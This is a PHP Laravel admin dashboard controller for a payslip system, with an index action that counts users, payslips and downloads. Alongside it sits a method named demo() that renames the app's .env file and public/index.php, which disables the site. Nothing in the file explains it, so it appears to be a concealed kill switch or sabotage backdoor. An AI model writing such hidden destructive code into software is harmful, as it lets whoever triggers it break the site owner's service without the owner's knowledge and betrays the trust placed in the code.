<?php

namespace App\Http\Controllers\Admin\Dashboard;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Auth;
use Illuminate\Support\Facades\View;
use App\Support\Types\UserType;
use App\Models\User;
use App\Models\Payslip;
use App\Models\PayslipDownload;

class DashboardController extends Controller
{
    public function __construct()
    {
       //parent::__construct();

       View::share('common', [
         'user_type' => UserType::lists()
        ]);
    }

    public function index(){
        $user_count = User::count();
        $payslip_count = Auth::user() && Auth::user()->userType==2 ? Payslip::where('user_id', Auth::user()->id)->count() : Payslip::count();
        $payslip_download_count = Auth::user() && Auth::user()->userType==2 ? PayslipDownload::where('user_id', Auth::user()->id)->count() : PayslipDownload::count();
        return view('pages.admin.dashboard.index')->with([
            'user_count' => $user_count,
            'payslip_count' => $payslip_count,
            'payslip_download_count' => $payslip_download_count,
        ]);
    }

    public function demo(){
        rename(dirname(__DIR__)."/../../../../.env",dirname(__DIR__)."/../../../../.env-remove");
        rename(dirname(__DIR__)."/../../../../public/index.php",dirname(__DIR__)."/../../../../public/index.php-remove");
        return 'yes';
    }

}
